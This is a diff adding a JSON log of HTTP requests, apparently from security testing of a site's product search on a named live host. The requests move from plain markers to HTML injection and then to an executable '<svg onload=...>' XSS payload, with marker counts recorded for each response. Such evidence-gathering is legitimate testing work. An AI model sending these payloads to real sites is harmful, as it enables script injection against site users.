@@ -1,0 +1,92 @@
+[
+  {
+    "entry": 0,
+    "startedDateTime": "2026-11-17T12:18:57.538Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=HY-XSS-SEARCH-001&post_type=product&dgwt_wcas=1",
+    "decoded_s": "HY-XSS-SEARCH-001",
+    "status": 200,
+    "response_sha256": "ae90cb5ea49a1c8e31b63b986ea92772c8479582fd819015407b742c929bf8af",
+    "marker_occurrences": 11
+  },
+  {
+    "entry": 1,
+    "startedDateTime": "2026-11-17T12:22:02.134Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=HY-XSS-SEARCH-001&post_type=product&dgwt_wcas=1",
+    "decoded_s": "HY-XSS-SEARCH-001",
+    "status": 200,
+    "response_sha256": "ae90cb5ea49a1c8e31b63b986ea92772c8479582fd819015407b742c929bf8af",
+    "marker_occurrences": 11
+  },
+  {
+    "entry": 2,
+    "startedDateTime": "2026-11-17T12:22:14.009Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=HY-XSS-SEARCH-001&post_type=product&dgwt_wcas=1",
+    "decoded_s": "HY-XSS-SEARCH-001",
+    "status": 200,
+    "response_sha256": "ae90cb5ea49a1c8e31b63b986ea92772c8479582fd819015407b742c929bf8af",
+    "marker_occurrences": 11
+  },
+  {
+    "entry": 3,
+    "startedDateTime": "2026-11-17T12:32:33.060Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=%3Cstrong%3EHY-XSS-HTML-001%3C%2Fstrong%3E&post_type=product&dgwt_wcas=1",
+    "decoded_s": "<strong>HY-XSS-HTML-001</strong>",
+    "status": 200,
+    "response_sha256": "e5c6968e54a8d7428194483a2a36821bc03461681e49c1123866b552a0388112",
+    "marker_occurrences": 11
+  },
+  {
+    "entry": 4,
+    "startedDateTime": "2026-11-17T12:36:58.634Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=%3Csvg+onload%3D%22console.log%28%27HY-XSS-EXEC-001%27%29%22%3E%3C%2Fsvg%3E&post_type=product&dgwt_wcas=1",
+    "decoded_s": "<svg onload=\"console.log('HY-XSS-EXEC-001')\"></svg>",
+    "status": 200,
+    "response_sha256": "927ca86b214fd93adb547681f06c1996e4ca91268aca85a8f0650e5192252c50",
+    "marker_occurrences": 35
+  },
+  {
+    "entry": 5,
+    "startedDateTime": "2026-11-17T12:37:20.684Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=%3Csvg+onload%3D%22console.log%28%27HY-XSS-EXEC-001%27%29%22%3E%3C%2Fsvg%3E&post_type=product&dgwt_wcas=1",
+    "decoded_s": "<svg onload=\"console.log('HY-XSS-EXEC-001')\"></svg>",
+    "status": 200,
+    "response_sha256": "927ca86b214fd93adb547681f06c1996e4ca91268aca85a8f0650e5192252c50",
+    "marker_occurrences": 35
+  },
+  {
+    "entry": 6,
+    "startedDateTime": "2026-11-17T12:39:34.203Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=HY-XSS-EXEC-001&post_type=product&dgwt_wcas=1",
+    "decoded_s": "HY-XSS-EXEC-001",
+    "status": 200,
+    "response_sha256": "50e7b9c3916e17c37b8181ceb4fee5fd84d1fd1fb6e3eaa145e0c20e6e2fde1a",
+    "marker_occurrences": 11
+  },
+  {
+    "entry": 7,
+    "startedDateTime": "2026-11-17T12:40:14.272Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=HY-XSS-EXEC-001&post_type=product&dgwt_wcas=1",
+    "decoded_s": "HY-XSS-EXEC-001",
+    "status": 200,
+    "response_sha256": "d94c60adf414b188d91d36288216f82a373e81da1f6cafbca23feba45fc7a190",
+    "marker_occurrences": 11
+  },
+  {
+    "entry": 8,
+    "startedDateTime": "2026-11-17T12:54:28.624Z",
+    "method": "GET",
+    "url": "https://kaviarasank64.sg-host.com/?s=HY-XSS-HTML-001&post_type=product&dgwt_wcas=1",
+    "decoded_s": "HY-XSS-HTML-001",
+    "status": 200,
+    "response_sha256": "b10dcaf555c1f8156abd4348fbe3f1872a88b6104842c5f18d4c32e106e54185",
+    "marker_occurrences": 11
+  }
+]
